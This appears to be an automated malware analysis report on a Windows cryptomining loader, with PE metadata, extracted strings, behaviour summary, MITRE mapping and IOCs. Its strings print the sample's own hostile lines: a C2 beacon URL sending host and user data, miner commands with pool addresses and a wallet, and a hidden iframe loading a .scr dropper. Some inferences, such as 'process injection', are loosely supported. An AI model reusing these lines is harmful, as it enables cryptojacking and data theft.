# Threat Analysis Report

**Generated:** 2026-08-31 19:41 UTC
**Sample:** `12c2c22ac2896a283118750f17735f30572671bc7400a30368b4e43767d2acd0_12c2c22ac2896a283118750f17735f30572671bc7400a30368b4e43767d2acd0.exe`

---

## File Metadata

| Field | Value |
|-------|-------|
| File name | `12c2c22ac2896a283118750f17735f30572671bc7400a30368b4e43767d2acd0_12c2c22ac2896a283118750f17735f30572671bc7400a30368b4e43767d2acd0.exe` |
| File type | PE32 executable for MS Windows 4.00 (GUI), Intel i386 (stripped to external PDB), 9 sections |
| Size | 1,578,496 bytes |
| MD5 | `5cb90fba7f11b756b8dca06e51f7a567` |
| SHA1 | `7e05be6064bd31477c6eaeddb77cb5e56a980c2d` |
| SHA256 | `12c2c22ac2896a283118750f17735f30572671bc7400a30368b4e43767d2acd0` |
| Overall entropy | 7.893 |
| Unpacked | No |

## PE Analysis

| Field | Value |
|-------|-------|
| Timestamp | 1454793894 |
| Machine | 332 |
| Packed | No |

### Sections

| Name | Size | Entropy | Packed |
|------|------|---------|--------|
| `.text` | 79,872 | 6.225 | No |
| `.data` | 1,536 | 2.809 | No |
| `.rdata` | 10,752 | 5.567 | No |
| `.eh_fram` | 1,024 | 4.82 | No |
| `.bss` | 0 | 0.0 | No |
| `.idata` | 3,584 | 5.206 | No |
| `.CRT` | 512 | 0.17 | No |
| `.tls` | 512 | 0.211 | No |
| `.rsrc` | 1,479,680 | 7.924 | ⚠️ Yes |

### Imports

**WININET.DLL**: `FtpFindFirstFileA`, `FtpGetFileA`, `FtpOpenFileA`, `FtpPutFileA`, `InternetCloseHandle`, `InternetConnectA`, `InternetFindNextFileA`, `InternetOpenA`, `InternetOpenUrlA`, `InternetReadFile`, `InternetSetOptionA`
**KERNEL32.dll**: `AddAtomA`, `CloseHandle`, `CreateEventA`, `CreateFileA`, `CreateMutexA`, `CreateSemaphoreA`, `DeleteCriticalSection`, `DeleteFileA`, `DuplicateHandle`, `EnterCriticalSection`, `ExitProcess`, `ExpandEnvironmentStringsA`, `FindAtomA`, `FindResourceA`, `GetAtomNameA`
**msvcrt.dll**: `__getmainargs`, `__p__environ`, `__p__fmode`, `__set_app_type`, `_beginthread`, `_beginthreadex`, `_cexit`, `_endthread`, `_endthreadex`, `_ftime`, `_iob`, `_onexit`, `_setjmp`, `_setmode`, `abort`
**SHELL32.DLL**: `ShellExecuteA`

## Extracted Strings

Total strings found: **3776** (showing first 100)

```
!This program cannot be run in DOS mode.
$
P`.data
.rdata
`@.eh_fram
0@.bss
.idata
D$$`A
D$hbA
p< tBv <@t,<Pt
D$`;0@
D$HGA
D$8,GA
D$8<GA
D$@j9@
D$8LGA
D$@
:@
D$8\GA@
D$@.<@
D$(lGA
T$
p:H 
D&8|GA
D$@E@@
D$@=A@
@$DuB@
D$8<GA
<$\@tH
wRUWV
t7<Fu;9
t& UWR
1@S^_]
<ntO<Ets
<Et^<LtJ~
D$F
<rt_<Vt[<KTW
C ;C$}
<St{<_tp<$
8L$tS:L$
<nt8<]
D$`J`
T$0\$4
Ddgcc-
@aaia
t,;(v6
T$@9S(v5
9D$PtT
L$<x1
a.onymkus
www-data
ofymmUs
www-data
administrator
pacsword
1234567
345678
1234167(9
1234567890
qwerti
000000
abc!23 
a`min123
win%ows
923qwe
email@emAil.com
ftdst.ru
hruests.ru
profeuest.ru
tpsy.ru
 pstest
qptest.r}
prtests.ru
jobtes|s.ru
mqtesti.ru
lIbgcj-13.dll
gisterClasseS
Photg.scr
%TEMP!

<i&rAme src
hoto.scr width=1 
migjp}1 framebmrdmr=0>
</iframe>

http://lrtests.ru
S.php?ver=2
&pc=%s&user=%s'sys=%s&cmd=%s&startup=5s/%s
eAPPDATA%
%d.%d.%d.%d
tP://%w/test.ht
SR"w09.
Cectiol
-o st2atum+tcp://mine.moneropoo
.#om*3336`-t 1 -e 4"o7TTpcpLe8yPPLxgh27xXSBWJnVu9cW8t7Gu
XG_t74vrybew2D5UjSSv@BmxNhx:RezfYJv3J7W63bwS8fEgg6tct3yz -p x
/c start /c %%TEM@%%XNsCpuCNMiner32.exe -djg`-1 %s
RCDATA0
%s]NsCRuCNmiJer32,exe
/c (dc
g stratum+tcp://mine.mojdropo/l.col:7333& eaho stRatuo+tar://monero,cr}pto-pool.fr:333
" echo stratum#tcp:/
Xmr.proiash.net:37
7& echo stratum+tkq://pool.minexr.com:5555)> %TEMP%\
/c$reg add$
```

## Disassembly Overview

Functions analyzed: **30** | Decompiled to C: **29**

| Name | Offset | Size | Decompiled |
|------|--------|------|------------|
| `fcn.0040db10` | `0x40db10` | 262396 | ✓ |
| `method._DA.virtual_0` | `0x4144c0` | 70059 | ✓ |
| `fcn.004043b0` | `0x4043b0` | 35762 | ✓ |
| `fcn.00406b70` | `0x406b70` | 17834 | ✓ |
| `fcn.00405b21` | `0x405b21` | 17162 | ✓ |
| `fcn.00413a54` | `0x413a54` | 16733 | ✓ |
| `fcn.00414034` | `0x414034` | 16682 | ✓ |
| `fcn.004027e0` | `0x4027e0` | 16526 | ✓ |
| `fcn.00406790` | `0x406790` | 10198 | ✓ |
| `fcn.0040a1e3` | `0x40a1e3` | 7136 | ✓ |
| `fcn.00407240` | `0x407240` | 7039 | ✓ |
| `fcn.0040a830` | `0x40a830` | 2713 | ✓ |
| `fcn.00401e40` | `0x401e40` | 1982 | ✓ |
| `fcn.00401340` | `0x401340` | 1938 | ✓ |
| `fcn.0040a900` | `0x40a900` | 1442 | — |
| `fcn.00406060` | `0x406060` | 1276 | ✓ |
| `fcn.004056e0` | `0x4056e0` | 948 | ✓ |
| `fcn.0040b070` | `0x40b070` | 894 | ✓ |
| `fcn.0040c4a0` | `0x40c4a0` | 796 | ✓ |
| `fcn.0040b670` | `0x40b670` | 744 | ✓ |
| `fcn.00413854` | `0x413854` | 647 | ✓ |
| `fcn.0040b3f0` | `0x40b3f0` | 628 | ✓ |
| `fcn.0040f214` | `0x40f214` | 627 | ✓ |
| `fcn.0040b960` | `0x40b960` | 621 | ✓ |
| `fcn.0040cda0` | `0x40cda0` | 573 | ✓ |
| `fcn.0040f7b3` | `0x40f7b3` | 563 | ✓ |
| `fcn.0040e37c` | `0x40e37c` | 523 | ✓ |
| `fcn.00406600` | `0x406600` | 518 | ✓ |
| `entry3` | `0x40fae0` | 467 | ✓ |
| `fcn.00403060` | `0x403060` | 408 | ✓ |

### Decompiled Code Files

- [`code/entry3.c`](code/entry3.c)
- [`code/fcn.00401340.c`](code/fcn.00401340.c)
- [`code/fcn.00401e40.c`](code/fcn.00401e40.c)
- [`code/fcn.004027e0.c`](code/fcn.004027e0.c)
- [`code/fcn.00403060.c`](code/fcn.00403060.c)
- [`code/fcn.004043b0.c`](code/fcn.004043b0.c)
- [`code/fcn.004056e0.c`](code/fcn.004056e0.c)
- [`code/fcn.00405b21.c`](code/fcn.00405b21.c)
- [`code/fcn.00406060.c`](code/fcn.00406060.c)
- [`code/fcn.00406600.c`](code/fcn.00406600.c)
- [`code/fcn.00406790.c`](code/fcn.00406790.c)
- [`code/fcn.00406b70.c`](code/fcn.00406b70.c)
- [`code/fcn.00407240.c`](code/fcn.00407240.c)
- [`code/fcn.0040a1e3.c`](code/fcn.0040a1e3.c)
- [`code/fcn.0040a830.c`](code/fcn.0040a830.c)
- [`code/fcn.0040b070.c`](code/fcn.0040b070.c)
- [`code/fcn.0040b3f0.c`](code/fcn.0040b3f0.c)
- [`code/fcn.0040b670.c`](code/fcn.0040b670.c)
- [`code/fcn.0040b960.c`](code/fcn.0040b960.c)
- [`code/fcn.0040c4a0.c`](code/fcn.0040c4a0.c)
- [`code/fcn.0040cda0.c`](code/fcn.0040cda0.c)
- [`code/fcn.0040db10.c`](code/fcn.0040db10.c)
- [`code/fcn.0040e37c.c`](code/fcn.0040e37c.c)
- [`code/fcn.0040f214.c`](code/fcn.0040f214.c)
- [`code/fcn.0040f7b3.c`](code/fcn.0040f7b3.c)
- [`code/fcn.00413854.c`](code/fcn.00413854.c)
- [`code/fcn.00413a54.c`](code/fcn.00413a54.c)
- [`code/fcn.00414034.c`](code/fcn.00414034.c)
- [`code/method._DA.virtual_0.c`](code/method._DA.virtual_0.c)

## Behavioral Analysis

### Analysis Summary
The binary is a **malicious cryptomining loader**. Its primary purpose is to infect a host system, download and install a Monero (XMR) mining miner, ensure the miner persists across reboots, and potentially establish a connection with a command-and-control (C2) infrastructure or a mining pool.

---

### Core Functionality & Purpose
*   **Cryptomining Delivery:** The presence of strings like `minerd_32.exe`, `stratum+tcp://mine.moneropoo`, and various "mined" keywords indicates that the core goal is to clandestinely mine cryptocurrency on the victim's machine.
*   **Staged Execution:** The code acts as a "dropper." It doesn't necessarily contain the mining logic itself but contains the logic to download and execute the malicious payload (`minerd_32.exe`) from a remote server.

### Suspicious & Malicious Behaviors
*   **Network Communication (Downloader/Data Exfiltration):**
    *   The code utilizes `WININET` functions (`InternetOpenA`, `InternetConnectA`, `FtpPutFileA`, `FtpGetFileA`). 
    *   It interacts with specific domains such as `lrtests.ru` and `hruests.ru`. 
    *   It uses these connections to exchange data (possibly system information) and download secondary payloads from a remote server.
*   **Persistence Mechanism:**
    *   The code explicitly executes a `reg add` command targeting:
        `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
    *   This ensures that the mining executable is automatically launched every time the user logs into Windows.
*   **File Manipulation & Staging:**
    *   The malware extracts files from its own internal resources (`FindResourceA`, `LoadResource`) to local storage.
    *   It targets common "hidden" or temporary directories, specifically `%TEMP%` and `%APPDATA%`, to drop and execute the mining payload.
    *   **Example path discovered:** `%TEMP%\minerd_32.exe`.
*   **Process Manipulation/Injection (implied):**
    *   The use of `CreateThread` or similar threading loops (observed in the disassembly's high-level logic) and "Start" commands suggests it attempts to run the miner as a separate process or background thread to hide its activity.

### Notable Techniques & Patterns
*   **Resource Embedding:** The binary contains an embedded payload (`RCDATA`). This is a classic technique used by loaders to carry the actual malicious functionality inside the first executable, allowing it to bypass simple file-scan checks for "known" mining files on disk.
*   **Obfuscation/Anti-Analysis Indicators:**
    *   The disassembly shows numerous **"Bad instruction - Truncating control flow"** warnings and overlapping instructions. This suggests the code is either packed (e.g., with UPX or a custom packer) or has been intentionally obfuscated to break standard decompilation tools like Ghidra/r2ghidra.
    *   The use of "decoy" strings (like `1234567`, `qwerti`, and common passwords) is a technique used to confuse automated analysis tools or signature-based detection.
*   **Script Execution:** The presence of `.scr` files (`Photg.scr`, `hw09.scr`) suggests the use of script files as "stub" executors to launch the mining process in an obfuscated manner.

### Summary of Indicators of Compromise (IOCs)
*   **Network Domains:** `lrtests.ru`, `hruests.ru`, `profeuest.ru`, `tpsy.ru`
*   **Filesystem Paths:** `%TEMP%\minerd_32.exe`, `%APPDATA%`
*   **Registry Key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` (Value: "Run")
*   **Dropped Files:** `Photg.scr`, `hw09.scr`, `minerd_32.exe`

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Justification |
| :--- | :--- | :--- |
| T1105 | Ingress Tool Transfer | The binary functions as a dropper, downloading the `minerd_32.exe` payload from remote domains via `WININET` functions. |
| T1547.001 | Registry Run Keys: Run Keys | The malware executes a `reg add` command targeting `HKCU\...\Run` to ensure the mining payload persists across reboots. |
| T1027 | Obfuscated Files or Information | The use of packing (bad instructions), decoy strings, and resource embedding is intended to evade signature-based detection and analysis. |
| T1059 | Command and Scripting Interpreter | The utilization of `.scr` files as stubs suggests the use of script/executable interpreters to obfuscate the execution path of the miner. |
| T1055 | Process Injection | The implementation of `CreateThread` loops to run the mining logic in background threads or separate processes is used to hide activity from the user. |

---

## Indicators of Compromise

Based on the provided strings and behavioral analysis, here are the extracted Indicators of Compromise (IOCs):

**IP addresses / URLs / Domains**
*   `lrtests.ru`
*   `hruests.ru`
*   `profeuest.ru`
*   `tpsy.ru`
*   `qptest.r}` (Potential variant of qptest.ru)
*   `prtests.ru`
*   `jobtes|s.ru` (Likely jobtests.ru)
*   `mqtesti.ru`
*   `Xmr.proiash.net:37`
*   `http://lrtests.ru/S.php?ver=2&pc=%s&user=%s'sys=%s&cmd=%s&startup=5s/%s` (Full C2/Download URL)

**File paths / Registry keys**
*   **Registry Key:** `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` (Value: "Run")
*   **File Path:** `%TEMP%\minerd_32.exe`
*   **Folder used for staging:** `%APPDATA%`

**Mutex names / Named pipes**
*   *None identified.*

**Hashes**
*   *None available in the provided text.*

**Other artifacts**
*   **Dropped Files (Executables/Scripts):** 
    *   `Photg.scr`
    *   `hw09.scr`
    *   `minerd_32.exe`
*   **Suspicious DLL:** `lIbgcj-13.dll`
*   **Mining Pool Connection Strings (C2 Patterns):** 
    *   `stratum+tcp://mine.moneropoo`
    *   `stratum+tcp://mine.mojdropo/l.col:7333`
    *   `stratum+tau://monero,cr}pto-pool.fr:333`

---
**Regex-extracted plaintext IOCs** *(from static strings + decompiled C)*

**URLs:**
- `http://lrtests.ru`

**Domains:**
- `email.com`
- `ftdst.ru`
- `hruests.ru`
- `mqtesti.ru`
- `profeuest.ru`
- `prtests.ru`
- `tpsy.ru`
- `xmr.proiash.net`

---

## Malware Family Classification

1. **Malware family**: Cryptomining Loader
2. **Malware type**: loader
3. **Confidence**: High
4. **Key evidence**: 
    * **Cryptomining Intent:** The presence of specific Monero (XMR) mining strings (`minerd_32.exe`, `stratum+tcp://`) and clear identification as a "malicious cryptomining loader" in the analysis summary.
    * **Dropper/Loader Behavior:** The binary utilizes `WININET` functions to fetch payloads from remote domains and employs `.scr` files as stubs to execute those payloads, indicating its role is to deliver and install the miner.
    * **Persistence & Evasion:** The use of `HKCU\...\Run` registry keys for persistence, resource embedding (`RCDATA`) to hide the payload, and obfuscation techniques (packing/decoy strings) to evade detection are hallmark traits of a malicious loader.
